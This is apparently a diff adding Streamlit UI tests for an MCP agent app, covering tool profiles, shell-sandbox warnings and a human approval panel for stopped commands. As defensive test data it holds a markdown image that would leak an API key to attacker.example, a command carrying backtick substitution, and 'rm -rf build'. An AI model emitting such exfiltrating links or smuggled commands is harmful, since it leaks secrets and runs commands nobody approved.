@@ -11,6 +11,8 @@ from pathlib import Path
 import pytest
 from streamlit.testing.v1 import AppTest
 
+from mcp_agent.state import SESSION_KEY
+
 APP = str(Path(__file__).parent.parent / "app.py")
 TIMEOUT = 30
 
@@ -459,3 +461,585 @@ def test_no_warning_when_the_tool_bound_expires_first(monkeypatch):
     app.run()
 
     assert not any("unusable until it is reset" in warning.value for warning in app.warning)
+
+
+# --- Profiles reach the agent --------------------------------------------------
+
+
+def _with_profiles(tmp_path, monkeypatch, payload: dict) -> None:
+    import json
+
+    path = tmp_path / "profiles.json"
+    path.write_text(json.dumps(payload), encoding="utf-8")
+    monkeypatch.setenv("MCP_PROFILES_PATH", str(path))
+
+
+def test_no_profiles_file_shows_no_selector(monkeypatch, tmp_path):
+    """One profile is not a choice, and a menu of one is noise."""
+    monkeypatch.setenv("MCP_PROFILES_PATH", str(tmp_path / "absent.json"))
+
+    app = run_app(monkeypatch)
+
+    assert not app.exception
+    assert not any("Profile" in box.label for box in app.selectbox), [
+        b.label for b in app.selectbox
+    ]
+
+
+def test_profiles_are_offered_and_described(monkeypatch, tmp_path):
+    _with_profiles(
+        tmp_path,
+        monkeypatch,
+        {
+            "general": {"description": "Everything, no shell."},
+            "research": {"description": "Search and read.", "mcp_servers": []},
+        },
+    )
+
+    app = run_app(monkeypatch)
+
+    assert not app.exception
+    chooser = [box for box in app.selectbox if "Profile" in box.label]
+    assert chooser, [b.label for b in app.selectbox]
+    assert chooser[0].options == ["general", "research"]
+    assert any("Everything, no shell." in caption.value for caption in app.caption)
+
+
+def test_a_broken_profiles_file_is_reported_and_survivable(monkeypatch, tmp_path):
+    """A typo in a hand-written file must not take the page down."""
+    path = tmp_path / "profiles.json"
+    path.write_text('{"general": }', encoding="utf-8")
+    monkeypatch.setenv("MCP_PROFILES_PATH", str(path))
+
+    app = run_app(monkeypatch)
+
+    assert not app.exception
+    assert any("not valid JSON" in error.value for error in app.error), [e.value for e in app.error]
+
+
+def test_a_profile_narrows_which_servers_are_opened(monkeypatch, tmp_path):
+    """The whole point of naming servers, and nothing else observes it.
+
+    Everything else about a profile is visible in the sidebar; this is not.
+    Measured with a mutation: replacing the profile's selection with the whole
+    configuration left every other test in this file green, so a profile could
+    silently open servers it was written to exclude.
+    """
+    import json
+
+    from mcp_agent.state import SESSION_KEY
+
+    (tmp_path / "config.json").write_text(
+        json.dumps(
+            {
+                "git": {"command": "python", "args": ["-c", ""], "transport": "stdio"},
+                "search": {"command": "python", "args": ["-c", ""], "transport": "stdio"},
+            }
+        ),
+        encoding="utf-8",
+    )
+    _with_profiles(
+        tmp_path,
+        monkeypatch,
+        {
+            "general": {"description": "Everything."},
+            "repository": {"description": "Just git.", "mcp_servers": ["git"]},
+        },
+    )
+
+    opened: list[dict] = []
+
+    async def spy(mcp_config):
+        opened.append(dict(mcp_config))
+        return []
+
+    monkeypatch.setattr("mcp_agent.agent.discover_tools", spy)
+
+    app = AppTest.from_file(APP, default_timeout=TIMEOUT).run()
+    app.session_state[SESSION_KEY].selected_profile = "repository"
+    app.run()
+    [button for button in app.button if button.label == "Apply Settings"][0].click().run()
+
+    assert not app.exception
+    assert opened, "Apply Settings never reached tool discovery"
+    assert list(opened[-1]) == ["git"], opened[-1]
+
+
+def test_the_selected_profile_reaches_the_agent(monkeypatch, tmp_path):
+    """The `app.py` -> `build_agent` hop, which nothing else observes.
+
+    Measured: dropping the profile at the call site left every other test
+    green, so the sidebar would name a profile while the agent was built from
+    the default — no ceilings, and none of the profile's own prompt.
+    """
+    import json
+
+    from mcp_agent.agent import AgentBundle
+    from mcp_agent.state import SESSION_KEY
+
+    (tmp_path / "config.json").write_text(json.dumps({}), encoding="utf-8")
+    _with_profiles(
+        tmp_path,
+        monkeypatch,
+        {
+            "general": {"description": "Everything."},
+            "repository": {
+                "description": "Just git.",
+                "system_prompt": "You are in a git repository.",
+                "limits": {"tool_calls_per_run": 7},
+            },
+        },
+    )
+
+    built: list = []
+
+    async def spy(model_id, tools, checkpointer, effort=None, profile=None):
+        built.append(profile)
+        return AgentBundle(agent=object(), tool_count=0, estimated_prefix_tokens=0)
+
+    monkeypatch.setattr("mcp_agent.agent.build_agent", spy)
+
+    app = AppTest.from_file(APP, default_timeout=TIMEOUT).run()
+    app.session_state[SESSION_KEY].selected_profile = "repository"
+    app.run()
+    [button for button in app.button if button.label == "Apply Settings"][0].click().run()
+
+    assert not app.exception
+    assert built, "Apply Settings never reached build_agent"
+    assert built[-1] is not None, "build_agent was called without a profile"
+    assert built[-1].name == "repository", built[-1]
+    assert built[-1].limits.tool_calls_per_run == 7
+
+
+# --- The sidebar tells the truth about the shell --------------------------------
+
+
+def test_a_profile_wanting_a_shell_without_the_operator_switch_says_so(monkeypatch, tmp_path):
+    monkeypatch.delenv("MCP_ENABLE_SHELL", raising=False)
+    _with_profiles(
+        tmp_path,
+        monkeypatch,
+        {
+            "general": {"description": "Everything."},
+            "repository": {
+                "description": "Just git.",
+                "shell": {"enabled": True, "allow": ["git", "ls"]},
+            },
+        },
+    )
+
+    app = run_app(monkeypatch)
+    app.session_state[SESSION_KEY].selected_profile = "repository"
+    app = app.run()
+
+    assert any("MCP_ENABLE_SHELL" in info.value for info in app.info), [i.value for i in app.info]
+
+
+def test_a_sandboxed_shell_says_what_it_may_run(monkeypatch, tmp_path):
+    monkeypatch.setenv("MCP_ENABLE_SHELL", "true")
+    monkeypatch.delenv("MCP_SHELL_POLICY", raising=False)
+    _with_profiles(
+        tmp_path,
+        monkeypatch,
+        {
+            "general": {"description": "Everything."},
+            "repository": {
+                "description": "Just git.",
+                "shell": {"enabled": True, "allow": ["git", "ls"]},
+            },
+        },
+    )
+
+    app = run_app(monkeypatch)
+    app.session_state[SESSION_KEY].selected_profile = "repository"
+    app = app.run()
+
+    captions = " ".join(caption.value for caption in app.caption)
+    assert "sandboxed with no network" in captions, captions
+    assert "git, ls" in captions
+
+
+def test_a_host_shell_is_an_error_not_a_caption(monkeypatch, tmp_path):
+    """The one configuration where the page must not be reassuring.
+
+    Commands run as the process serving the page. A caption reads as
+    reassurance; this has to read as a warning, because it is one.
+    """
+    monkeypatch.setenv("MCP_ENABLE_SHELL", "true")
+    monkeypatch.setenv("MCP_SHELL_POLICY", "host")
+    _with_profiles(
+        tmp_path,
+        monkeypatch,
+        {
+            "general": {"description": "Everything."},
+            "unsafe": {
+                "description": "Runs on the host.",
+                "shell": {"enabled": True, "policy": "host", "allow": ["ls"]},
+            },
+        },
+    )
+
+    app = run_app(monkeypatch)
+    app.session_state[SESSION_KEY].selected_profile = "unsafe"
+    app = app.run()
+
+    errors = " ".join(error.value for error in app.error)
+    assert "on this host" in errors, errors
+
+
+# --- The approval panel ---------------------------------------------------------
+
+
+def _stop_for_approval(app, command: str = "git push origin main"):
+    """Put the session in the state a stopped command leaves behind."""
+    from mcp_agent.approvals import PendingApproval, StoppedAction
+
+    app.session_state[SESSION_KEY].pending_approval = PendingApproval(
+        actions=(StoppedAction(tool_name="shell", command=command, args={"command": command}),)
+    )
+    return app.run()
+
+
+def test_a_stopped_command_is_shown_verbatim(monkeypatch):
+    app = _stop_for_approval(run_app(monkeypatch))
+
+    assert not app.exception
+    assert any("git push origin main" in block.value for block in app.code), [
+        c.value for c in app.code
+    ]
+    assert any("needs your approval" in warning.value for warning in app.warning)
+
+
+def test_the_command_is_shown_as_code_never_as_markdown(monkeypatch):
+    """It is model output. A literal fence in it must not escape into the page."""
+    app = _stop_for_approval(run_app(monkeypatch), command="git push `id`")
+
+    assert any("git push `id`" in block.value for block in app.code)
+    assert not any("git push `id`" in block.value for block in app.markdown)
+
+
+def test_both_decisions_are_offered(monkeypatch):
+    app = _stop_for_approval(run_app(monkeypatch))
+
+    labels = [button.label for button in app.button]
+    assert any("Approve" in label for label in labels), labels
+    assert any("Reject" in label for label in labels), labels
+
+
+def test_the_chat_input_is_locked_while_a_decision_is_pending(monkeypatch):
+    """The graph is interrupted mid-turn.
+
+    A new message would append to a thread whose last tool call has no result,
+    which is the invalid sequence every other bound in this project exists to
+    avoid.
+    """
+    app = _stop_for_approval(run_app(monkeypatch))
+
+    assert app.chat_input[0].disabled is True
+
+
+def test_the_chat_input_is_open_when_nothing_is_pending(monkeypatch):
+    app = run_app(monkeypatch)
+    assert app.chat_input[0].disabled is False
+
+
+class _FinishedTurn:
+    """A turn that streams nothing and reports `result`."""
+
+    def __init__(self, result):
+        self._result = result
+
+    def __iter__(self):
+        return iter(())
+
+    @property
+    def result(self):
+        return self._result
+
+
+def _spy_resume(monkeypatch, outcome=None, *, explode=False):
+    """Install a Turn whose `resuming` records how it was called."""
+    import mcp_agent.turns as turns
+    from mcp_agent.agent import QueryResult
+
+    seen: dict = {}
+
+    class SpyTurn(turns.Turn):
+        @classmethod
+        def resuming(cls, agent, decision, **kwargs):
+            seen["decision"] = decision
+            seen.update(kwargs)
+            if explode:
+                raise RuntimeError("the loop went away")
+            return _FinishedTurn(outcome if outcome is not None else QueryResult(text="Done."))
+
+    monkeypatch.setattr("mcp_agent.turns.Turn", SpyTurn)
+    return seen
+
+
+def _click(app, label: str):
+    return [button for button in app.button if label in button.label][0].click().run()
+
+
+def test_approving_resumes_the_same_conversation(monkeypatch):
+    """A decision continues the interrupted turn; it is not a new question.
+
+    Measured: replacing `Turn.resuming` with a fresh `Turn` left every other
+    test green, and would have sent the literal decision dict to the model as
+    a user message while the stopped command sat in the checkpoint forever.
+    """
+    seen = _spy_resume(monkeypatch)
+    app = _stop_for_approval(run_app(monkeypatch))
+    thread = app.session_state[SESSION_KEY].thread_id
+
+    app = _click(app, "Approve")
+
+    assert not app.exception
+    assert seen.get("decision") == {"type": "approve"}
+    assert seen.get("thread_id") == thread, "the resume went to a different conversation"
+
+
+def test_rejecting_sends_a_rejection(monkeypatch):
+    seen = _spy_resume(monkeypatch)
+    app = _stop_for_approval(run_app(monkeypatch))
+
+    app = _click(app, "Reject")
+
+    assert seen.get("decision", {}).get("type") == "reject"
+    assert seen["decision"]["message"], "a rejection with no reason tells the model nothing"
+
+
+def test_a_finished_resume_clears_the_pending_command(monkeypatch):
+    _spy_resume(monkeypatch)
+    app = _stop_for_approval(run_app(monkeypatch))
+
+    app = _click(app, "Approve")
+
+    assert app.session_state[SESSION_KEY].pending_approval is None
+    assert app.chat_input[0].disabled is False
+
+
+def test_a_resume_that_fails_leaves_the_decision_on_offer(monkeypatch):
+    """The graph is still interrupted, so the decision is still the right one.
+
+    Clearing on the click instead would strand it: nothing in the page could
+    resume the turn, and the conversation would be stuck with a tool call that
+    has no result.
+    """
+    _spy_resume(monkeypatch, explode=True)
+    app = _stop_for_approval(run_app(monkeypatch))
+
+    app = _click(app, "Approve")
+
+    assert app.session_state[SESSION_KEY].pending_approval is not None
+    assert not app.exception, [str(e) for e in app.exception]
+
+
+def test_replayed_answers_do_not_fetch_images(monkeypatch):
+    """A transcript is redrawn on every rerun, so an embed fetches every time.
+
+    Measured: filtering the streaming path but not the replay left every other
+    test green, and the replay is the path that repeats.
+    """
+    app = run_app(monkeypatch)
+    app.session_state[SESSION_KEY].history = [
+        {"role": "user", "content": "summarise that page"},
+        {
+            "role": "assistant",
+            "content": "Done. ![](https://attacker.example/?k=sk-ant-leak)",
+            "tool_log": "",
+        },
+    ]
+    app = app.run()
+
+    drawn = " ".join(block.value for block in app.markdown)
+    assert "attacker.example" not in drawn, drawn
+    assert "Done." in drawn
+
+
+def _stop_for_two(app, first="git push", second="rm -rf build"):
+    from mcp_agent.approvals import PendingApproval, StoppedAction
+
+    app.session_state[SESSION_KEY].pending_approval = PendingApproval(
+        actions=(
+            StoppedAction("shell", first, {"command": first}),
+            StoppedAction("shell", second, {"command": second}),
+        )
+    )
+    return app.run()
+
+
+def test_both_stopped_commands_are_shown(monkeypatch):
+    """A model can call two tools in one message, and one interrupt carries both.
+
+    Showing one and hiding the other asks someone to decide about something
+    they cannot see. Measured: rendering only the first left the suite green.
+    """
+    app = _stop_for_two(run_app(monkeypatch))
+
+    shown = [block.value for block in app.code]
+    assert "git push" in shown and "rm -rf build" in shown, shown
+    assert any("2 commands" in warning.value for warning in app.warning)
+
+
+def test_the_whole_interrupt_is_handed_to_the_resume(monkeypatch):
+    """The middleware counts the decisions it gets back.
+
+    Measured: dropping `pending=` from the call left the suite green, and the
+    resume would raise on any two-action interrupt — wedging the thread while
+    the page cleared the approval over a graph that could not advance.
+    """
+    seen = _spy_resume(monkeypatch)
+    app = _stop_for_two(run_app(monkeypatch))
+
+    app = _click(app, "Approve")
+
+    assert seen.get("pending") is not None, "the resume was given no interrupt to answer"
+    assert len(seen["pending"]) == 2
+
+
+def test_a_resume_that_fails_reports_it_rather_than_crashing(monkeypatch):
+    """The earlier version of this test asserted only that the decision stayed.
+
+    It passed while the page ended in an uncaught traceback — it was the one
+    case in this file that never asserted `not app.exception`, which is how it
+    concealed that the call site had no error handling at all.
+    """
+    _spy_resume(monkeypatch, explode=True)
+    app = _stop_for_approval(run_app(monkeypatch))
+
+    app = _click(app, "Approve")
+
+    assert not app.exception, [str(e) for e in app.exception]
+    assert app.session_state[SESSION_KEY].pending_approval is not None
+    assert any("still waiting" in error.value for error in app.error), [e.value for e in app.error]
+
+
+def test_the_question_reaches_the_transcript(monkeypatch):
+    """`record` is given the query, so the conversation shows what was asked."""
+    import mcp_agent.turns as turns
+    from mcp_agent.agent import QueryResult
+
+    class SpyTurn(turns.Turn):
+        def __init__(self, agent, query, **kwargs):
+            self._done = QueryResult(text="Half past four.")
+
+        def __iter__(self):
+            return iter(())
+
+        @property
+        def result(self):
+            return self._done
+
+    monkeypatch.setattr("mcp_agent.turns.Turn", SpyTurn)
+
+    app = AppTest.from_file(APP, default_timeout=TIMEOUT).run()
+    app.session_state[SESSION_KEY].session_initialized = True
+    app.session_state[SESSION_KEY].agent = object()
+    app.run()
+    app = app.chat_input[0].set_value("what time is it").run()
+
+    history = app.session_state[SESSION_KEY].history
+    assert {"role": "user", "content": "what time is it"} in history, history
+
+
+# --- A stopped command has to still be there after a reload ----------------------
+
+
+def _seed_an_interrupted_thread(db_path: str, thread_id: str) -> None:
+    """Stop a real graph in front of a person and leave it in the checkpoint.
+
+    Built separately from the agent the app will build, on purpose: a reload is
+    a different process, and the question is whether the interrupt survives the
+    crossing rather than whether one object can read its own memory.
+    """
+    import asyncio
+
+    import aiosqlite
+    from langchain.agents import create_agent
+    from langchain_core.messages import AIMessage
+    from langgraph.checkpoint.sqlite.aio import AsyncSqliteSaver
+
+    from mcp_agent.agent import build_middleware, run_query
+    from mcp_agent.models import MODEL_REGISTRY
+    from mcp_agent.profiles import Profile, ShellSettings
+    from tests.fakes import ScriptedModel
+
+    profile = Profile(
+        name="approving",
+        shell=ShellSettings(enabled=True, allow=("git",), approve=("git push",)),
+    )
+
+    async def seed() -> None:
+        connection = await aiosqlite.connect(db_path)
+        saver = AsyncSqliteSaver(connection)
+        await saver.setup()
+        model = ScriptedModel(
+            replies=[
+                AIMessage(
+                    content="",
+                    tool_calls=[{"name": "shell", "args": {"command": "git push"}, "id": "c1"}],
+                ),
+                AIMessage(content="Done."),
+            ]
+        )
+        spec = MODEL_REGISTRY[next(iter(MODEL_REGISTRY))]
+        agent = create_agent(
+            model, [], checkpointer=saver, middleware=build_middleware(profile, model, spec)
+        )
+        await run_query(
+            agent, "push it", lambda *a, **k: None, thread_id=thread_id, recursion_limit=10
+        )
+        await connection.close()
+
+    asyncio.run(seed())
+
+
+def test_a_stopped_command_is_still_on_offer_after_a_reload(monkeypatch, tmp_path):
+    """The approval feature's whole point, across the one event that erases it.
+
+    `pending_approval` is Streamlit session state and a reload starts a new
+    session, so the page came back showing the interrupted turn as a finished
+    answer with the chat input unlocked — over a thread whose last tool call
+    has no result. The checkpoint held the interrupt the entire time and
+    nothing asked it. `tests/test_approvals.py` proved the *data* survived,
+    which is why this went unnoticed: the missing piece was the page reading
+    it back, and only driving the real script can see that.
+    """
+    import json
+
+    from mcp_agent.state import SESSION_KEY
+
+    db = tmp_path / "reload.db"
+    monkeypatch.setenv("CHECKPOINT_DB_PATH", str(db))
+    monkeypatch.setenv("MCP_ENABLE_SHELL", "true")
+
+    profiles = tmp_path / "profiles.json"
+    profiles.write_text(
+        json.dumps(
+            {
+                "approving": {
+                    "description": "Stops for a person.",
+                    "shell": {"enabled": True, "allow": ["git"], "approve": ["git push"]},
+                }
+            }
+        ),
+        encoding="utf-8",
+    )
+    monkeypatch.setenv("MCP_PROFILES_PATH", str(profiles))
+
+    _seed_an_interrupted_thread(str(db), "stopped-thread")
+
+    app = AppTest.from_file(APP, default_timeout=TIMEOUT)
+    app.query_params["thread"] = "stopped-thread"
+    app.run()
+    assert not app.exception
+
+    app = _apply_settings(app)
+    assert not app.exception
+
+    pending = app.session_state[SESSION_KEY].pending_approval
+    assert pending is not None, "the reloaded page does not know a command is waiting"
+    assert pending.command == "git push"
+    assert app.chat_input[0].disabled, "the input is open over a thread that cannot advance"
+    assert any("git push" in block.value for block in app.code), "the command is not on screen"
